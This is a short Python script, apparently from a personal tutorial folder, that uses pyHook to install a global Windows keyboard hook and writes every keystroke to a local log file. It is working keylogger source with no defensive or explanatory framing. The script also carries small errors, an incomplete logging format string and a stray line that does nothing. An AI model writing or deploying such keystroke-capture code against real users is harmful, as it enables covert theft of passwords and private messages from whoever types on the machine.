import pyHook, pythoncom, sys, logging

file_log ='C:\\Users\\Mourad\\python workspace\\tutorial\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = pyHook.HookManager() #create hook manager
hooks_manager.KeyDown = OnKeyboardEvent #watch for key press
hooks_manager.HookKeyboard() #set the hook
pythoncom.PumpMessages() #wait for events﻿
